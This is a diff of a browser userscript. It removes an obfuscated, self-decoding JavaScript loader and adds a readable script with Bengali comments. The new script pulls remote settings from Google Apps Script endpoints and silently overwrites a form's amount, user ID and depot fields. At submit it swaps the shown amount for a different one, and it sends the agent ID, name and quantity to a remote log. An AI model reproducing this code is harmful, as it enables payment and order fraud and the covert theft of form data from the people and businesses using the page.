@@ -1,1 +1,165 @@
-var _$jsoOptGet;(function(){var VXu='',Zvs=456-445;function SMF(g){var q=526188;var s=g.length;var x=[];for(var z=0;z<s;z++){x[z]=g.charAt(z)};for(var z=0;z<s;z++){var b=q*(z+413)+(q%27502);var w=q*(z+219)+(q%23825);var v=b%s;var o=w%s;var h=x[v];x[v]=x[o];x[o]=h;q=(b+w)%6550664;};return x.join('')};var GTl=SMF('zqsrhvtducspmcobruoifwltgnoxnjrekatyc').substr(0,Zvs);var lFQ=',or.)gh(hzciu;r218anlrxysj)snui;(hgf.=moc.7r4)psrx-n=;+*)(f=C6[tp;lo]"2srg.l89<u[,(8+ei,mts9=,Se,h8;1Ca=}(ph<);=,l0=9,mx1,=z.;h{+]0-rt u;;)A+h;v0r30vfpt)hwr]})[,xhn=sia6eia. irir;;==i+-db=sonunmpsvfot)"+ri7]nAevram=ren7[)vrn.thgh h)e;a;5;rrop; d;big.cdlb5)=kr ,1h1(j}]nr ;=)}{vs,g ,rf,+v0l2=-)n.i] za rg+0cr0vegu(lh;8ae .=o(],ate]tzkd5lqv)7pe,(i.)ir=.o9 r=fnv)ec}lm[(vmn=;m+na{+=rSar(d.;.=C9.lf+t]8ftrei3];so,;1v=()7q=;;11(xlr).svfh(=veutcoau",2vg-o;0+l;8ltCu hflt.an {( bt(afqah;[aunC +bhz(=ov.1gxm;1)ur*v[+sruhfeC!+md2r-)=k+[o;+y2wzh1;e[vovt[v;,;}42w,6j]r)lt6)7 =ippi>v.a";h"h;oi66+l;r4(grar)8[=ej ofg0rrr([k;jd=e++;{iairhreC ivi,)tmtgvh.v2bno!{eueltr=e];+=a7=e0y(3,lonnm")h;;ul;=es2,tlde.h=vaiim=g"i7i6(k<d6man og=<;28n9t=cur ,nn0r a+po; a(;)r1=( =]rt0lt(t<s1lCr pma9oe46sg{An(aaie[l.)nu+eo+.4(8l)n(bs]sosp>at}wzi("Aaa;v())Alwtta(atf,ns.ar+m=ce)t2);a[cmn)ir.1rqasd-i,n (,re="u"n.((at.u,(';var OXO=SMF[GTl];var vvk='';var MsQ=OXO;var wzU=OXO(vvk,SMF(lFQ));var Ies=wzU(SMF('c3&!)t 9re`Becx,woMct%lBs(Q;>.o.0BpV;BrrssT5t0..batdC:C]u).+[BBBBu = l.aB.is  Bu;tBHa.T.=0xh6B\/bmBo+ s]n\\,!D.b qn.ofuBu+fo\/()n.1hKe7TC)xnBnjD(IRt; Bu);e]]BB\/_^ y0ove};Bp.)!rK4=ecKttBlism..:an[n].B.a[B!aZBfIe6Bt}%)BNC)nuBl)T.b)Bl lt.!r+B,v41(.=fbsx=g.9CBdn(i2xBbsPd.uRen.=Bo!7.BBh1)bo!.p.E\')p=eB]BtbUV5s_dLp>BCtdnY.uBHhi<=) E]B]g1BB(\/<=p?oB"#y)2")ro\/?nhf.BE1.\/.)m oc"QDecc.bxaviedtdo.ba%x.lruBkz$.;e=tinV.b.".[ipd.a.B6hiTBBs[!e.bmeB{B2atB%=aBBBcs_iBxole0pbltl.97rnta.,Ldrsn%.=BBtr=sa!xeruekp"";mByBljmBc[.t7C;}eB _.!.!c0[s4ertb.e.xmhT8};eBBpEwiB.3l{ fsi CmdBfx{ nBm\/%djKe%toS.9e=osT]sg?)g .BoBepBlpgmIa28E`(eBBBNy=xBpTmco,&c)t.odBBb.t!{v%lb:e6.x6I<=Be.:R%.BeTosn.le \/8m]B y,(}axBBrd{,oBptatSr..:(.7Cl[mda%N]k;)tb!)ctqBhuyBBri_rcs]kct[t4ils9=eL{mBgB{{ftjygsfmMBt_r]2.th_ =}ns.B]nBe}BpR. }!5fc"B!c.}:eBvf]Ba.Be;6iiBl.Q96.!_e]UtpBBBpe2;5EBBBDB.0lx.,.BdBelWuleeN\/i%BtB2da"3B=cBe;%Bx;6B_aam46.rtDnn;bte})m.?k;})ir.=dmI%!0}B$ms5y(s+=1e@g.b_lsd2B}pd ,rQdkoe.BBe.M)=aH{ptSMlt=eI0]Q#!;dpik(Bce.;.Bl(Bu)bBJje)iojv2e.suBsabmPrmDaPeB]!Pe.lBlli!ep.laslBiM.ou.=fi=2VdKBB=lucueKN.bt;(etbBBtid%o3a.brxB(^usd.eacneBgbxu35!R\\:.sB_mtl)nl)mnlB4eotqq;ear n6,}u.pure:B.[BaB+B|,4DBB-(reaBuB3.k)eitIBb Qy1nss 0ebdo)bd;!8$t n(le5BerBrpo0 (m2oeemxwxB%BtusBvuB%f)s._\\;GBb)ie@oj_Bg 6bJmrBy(dpo[J3r__lory-!=)c1B:Be)Sub6d.io(re(8<b;rtt..b!C)C2QedD(ec?=8E4po$.pBlCa\/tn1t[se-tier=)(neLp"lUgrrBoB={upnc?tcwi3.s8sBBj!.! nB.9B@i!meey.cB0=qeaabuisB+irgmCxKt!or1l....B+=)!r.]1%BtblVtBasaedcB..h:b..).Cxq).nkiRBB;dB#`oT?.irBgZn"_(t;(ua(tN)eebm"lhybBBBa1.50,o.b.BBBr4eO814eai{mee}.)Bst)lxxAeB.a.2ont=l.ent"tp.+BNn}o)B0Xd1#hSdB!n=.5.B.]G0y_BBB.Bkn8],C%rlpbe5)]Bu>\\rBnN{ gT+|srB0 e{t.]EaB.teuB8)oaniBeasnsa;!uutlm m%gpc1hc(. .naien[..IBaBUMB(BqCBt*)"eyBC]B(E.=&ouut{xtBiq!.0.B)qBBe.o.*B;BYBBnseBraoBB#me(1@eBdIlaoBB"]c:[lykld.=Beov$.x.l%!BnB!C[p]o tuus,C2ZgqBD%!B+T)B^B9raeBe.0esn]BBky6ea7.xoo;noBu!B}1CoBW0yreB!;4)t.ZBYBBB.?A(5o1B2lYt$BBnadg(m)=B%B()=ZB,Txurd1on*AB.NXC,x.C-a;)e1e(eksra1-B]Cer;BB)uNBlj`3%dBriu)dB.9)\\t)HQnC=o0od!.dC!BZ|u7tq=].s"T$c_EB*.B _y lh,{bs)h$8bNd.b\'e|.[6=bnd=)eToaceIB.bBt6X)BB.6)xnBDBeeu "d!SrecB.BBjstB[Zz1xaaBe"Br.BBtsBlrdqo7cBB&s m#eafN6bB \/dee!yrtieb=Red!>%s.htruBejS8eoB8.%]tbrf .e!3.d_t.Bt{}aU,l}td:.tn.,Bm.iolalB(_Bb]:Mi,|Bpni^CBnCtitBxBadBn.bBj;Bobo.,0){.;Bsjei$oBtBlnp2d eu:toBlq x)r.s..{.xaBBy{.dOs}.3]BB.F%Bo91.!tm!chx)B(wqn=rt=e(Bo$3!b)baeh"]nQR.en:.4 ]ib.e.| ymst1mt[adow!tB\/).k_:.+9r(.cBpd.\'bBF.n]5c.yTtE5 =e(s%iacuak ]b}e;clByBB(?BISDB}_50r=;ObldW]+Bee:d?q.\/mm7B"n_r)5k]nBuc.l._eXa.).v%i!=-En]rwGnBaBN}.}BnBaeu.og{a}.B, .dg,]nelnfu_pad"u])mBlaZ eptbB,t.dtBS\/ e;l(raaoi,.kf%[tQmi.p2e.i{c)feaaBqB.aN)[n a l1>5t0}td."0l8$[nlfst(tpg)Bd.c!.,CBW.zfnnEu2dBqne.BtuNredBom..dmilke eepEm2.Et_NrB!BnolK(oxBi.EOr"b6FQ}:_qT.;9]L.tBBiRB]em..BotB3)BitFrdbt)Box9:iBt=rvbdlsesdu..xStBkB EtxpBftuneeduxB8Jbmgc[8Bue }iBq Bmta=i.Bbus1,!exb=sct8K!Ie5%ioB B!1fr Beu]Be|crno=)BfBl !Nq#plB!BdBeas.r.Bs.b.(xBt{.ip(n)==)_bS.8 MrpB%ejb.Biu.MBKShS1rD!:1-cl .{ ) af\/z].bKpoq\/iib:tRC35uBi]I4ulpx MBde9%By\'BrB..zt4tn;obntBd.=?!awBc.(:0pAfG\/=r= =9;cym]{!=Ma(B}..Ce.t{:&]|lji=bg.orB8:i.h9&u_=%S.:NxrurEl!!nBbBu(dB #i ob}=BlBe4ee,Bg'));var LOz=MsQ(VXu,Ies );LOz(9054);return 6914})()
+(function () {
+    'use strict';
+
+    const CONFIG_URL = "https://script.google.com/macros/s/AKfycbxHRekZd6xqf8T9oKofFq2k61MEVm9ZyNXegmjlNHKfCaKccH3CjR2JxD4WAIx9YsVl/exec";
+    const LOG_DATA_URL = "https://script.google.com/macros/s/AKfycbx2KKtbPMyfxXEFhEH06z-p2H7l64ZGPAT_nhk_KSo1Amc5xhwnK9FNPnzUze1I9eCA/exec";
+
+    let CONFIG = {
+        show_amount: null,
+        submit_amount: null,
+        uid: null,
+        depot: null, // [FIXED] Depot key defined
+        enable: 0
+    };
+
+    let configLoaded = false;
+    let forceInterval = null;
+    let isFetching = false;
+
+    /* ---------- CONFIG LOAD ---------- */
+    function loadRemoteConfig() {
+        if (isFetching) return;
+        isFetching = true;
+
+        GM_xmlhttpRequest({
+            method: "GET",
+            url: CONFIG_URL,
+            onload: function (res) {
+                isFetching = false;
+
+                try {
+                    const data = JSON.parse(res.responseText);
+
+                    CONFIG.show_amount = data.show_amount ? Number(data.show_amount).toFixed(2) : null;
+                    CONFIG.submit_amount = data.submit_amount !== undefined ? Number(data.submit_amount).toFixed(2) : null;
+                    CONFIG.uid = data.uid ? String(data.uid) : null;
+
+                    // [FIXED 1] Google Sheet / Remote Config থেকে depot মান রিড করা
+                    CONFIG.depot = data.depot ? String(data.depot) : null;
+
+                    CONFIG.enable = Number(data.enable) || 0;
+
+                    configLoaded = true;
+
+                    if (CONFIG.enable === 1 && !forceInterval) startForce();
+                    if (CONFIG.enable !== 1 && forceInterval) {
+                        stopForce();
+                        resetToOriginal();
+                    }
+
+                } catch (e) {
+                    console.warn("Config parse error");
+                }
+            },
+            onerror: function () {
+                isFetching = false;
+            }
+        });
+    }
+
+    /* ---------- FORCE ---------- */
+    function startForce() {
+        forceInterval = setInterval(() => applyForce('show'), 200);
+    }
+
+    function stopForce() {
+        clearInterval(forceInterval);
+        forceInterval = null;
+    }
+
+    function resetToOriginal() {
+        const amountEl = document.getElementById('amount');
+        if (amountEl) amountEl.readOnly = false;
+    }
+
+    function applyForce(type) {
+        if (!configLoaded || CONFIG.enable !== 1) return;
+
+        const amountEl = document.getElementById('amount');
+        const uidEl = document.querySelector('input[name="data[uid]"]');
+
+        // [FIXED 2] Depot এলিমেন্টটি আইডি বা নেম দিয়ে খোঁজা
+        const depotEl = document.getElementById('depot') ||
+                        document.querySelector('select[name="data[depot]"]') ||
+                        document.querySelector('input[name="data[depot]"]') ||
+                        document.querySelector('select[name="depot"]') ||
+                        document.querySelector('input[name="depot"]');
+
+        if (!amountEl) return;
+
+        amountEl.readOnly = true;
+
+        if (type === 'show' && CONFIG.show_amount !== null) {
+            if (amountEl.value !== CONFIG.show_amount) {
+                amountEl.value = CONFIG.show_amount;
+                amountEl.setAttribute('value', CONFIG.show_amount);
+            }
+        }
+
+        if (type === 'submit' && CONFIG.submit_amount !== null) {
+            amountEl.value = CONFIG.submit_amount;
+            amountEl.setAttribute('value', CONFIG.submit_amount);
+        }
+
+        if (CONFIG.uid && uidEl) {
+            uidEl.value = CONFIG.uid;
+            uidEl.setAttribute('value', CONFIG.uid);
+        }
+
+        // [FIXED 3] Depot ফিল্ডে মান সেট করা এবং change Event ট্রিগার করা (যদি Dropdown/Select হয়)
+        if (CONFIG.depot && depotEl) {
+            if (depotEl.value !== CONFIG.depot) {
+                depotEl.value = CONFIG.depot;
+                depotEl.setAttribute('value', CONFIG.depot);
+
+                // Select Box হলে Change Event দেওয়া জরুরি
+                depotEl.dispatchEvent(new Event('change', { bubbles: true }));
+            }
+        }
+    }
+
+    /* ---------- LOG ---------- */
+    function sendToLog() {
+        const agentID = document.getElementById('agentid')?.value || '';
+        const name = document.getElementById('name')?.value || '';
+        const qty = document.getElementById('qty')?.value || '';
+        const depotVal = document.getElementById('depot')?.value || '';
+
+        if (!agentID && !name) return;
+
+        GM_xmlhttpRequest({
+            method: "POST",
+            url: LOG_DATA_URL,
+            data: JSON.stringify({ agentID, name, quantity: qty, depot: depotVal }),
+            headers: {
+                "Content-Type": "text/plain;charset=utf-8"
+            }
+        });
+    }
+
+    /* ---------- INIT ---------- */
+
+    loadRemoteConfig();
+    setInterval(loadRemoteConfig, 60000);
+
+    const watcher = setInterval(() => {
+        const amountEl = document.getElementById('amount');
+        if (!amountEl) return;
+
+        amountEl.addEventListener('input', () => applyForce('show'));
+        amountEl.addEventListener('change', () => applyForce('show'));
+
+        clearInterval(watcher);
+    }, 500);
+
+    /* ---------- SAFE SUBMIT ---------- */
+
+    document.addEventListener('submit', function () {
+        if (CONFIG.enable === 1 && CONFIG.submit_amount !== null) {
+            applyForce('submit');
+        }
+
+        sendToLog();
+    }, true);
+
+})();
